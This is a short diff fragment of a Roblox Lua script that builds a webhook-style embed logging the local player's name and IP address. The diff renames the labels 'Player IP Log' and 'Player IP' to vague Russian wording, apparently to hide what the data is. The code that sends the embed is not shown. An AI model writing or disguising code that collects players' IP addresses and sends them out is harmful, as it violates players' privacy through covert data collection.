@@ -28,14 +28,14 @@ local playerName = game.Players.LocalPlayer.Name
 
 local body = {
     ["embeds"] = {{
-        ["title"] = "Player IP Log",
+        ["title"] = "Типа ок",
         ["color"] = 16744448,
         ["fields"] = {{
             ["name"] = "Player Name",
             ["value"] = playerName,
             ["inline"] = true
         }, {
-            ["name"] = "Player IP",
+            ["name"] = "Player штука",
             ["value"] = ip,
             ["inline"] = true
         }, {
